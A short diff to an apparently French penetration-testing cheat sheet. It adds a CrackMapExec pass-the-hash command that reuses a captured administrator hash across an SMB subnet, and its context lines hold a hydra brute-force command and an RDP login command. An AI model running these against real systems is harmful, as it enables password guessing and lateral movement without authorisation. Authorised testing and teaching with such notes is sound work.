@@ -61,3 +61,12 @@ hydra -L user.txt -P password.txt -t12 -f x.x.x.x http-get / -V
 ```
 xfreerdp /f +clipboard /kbd:0x0000040C /u:USERNAME@DOMAIN /p:PASSWORD /v:IP
 ```
+
+
+#### CrackMapExec
+
+Une fois le hash administrateur récupéré sur un poste:
+
+```
+cme smb -u Administrateur -H HASH 192.168.20.0/24 --local-auth
+```
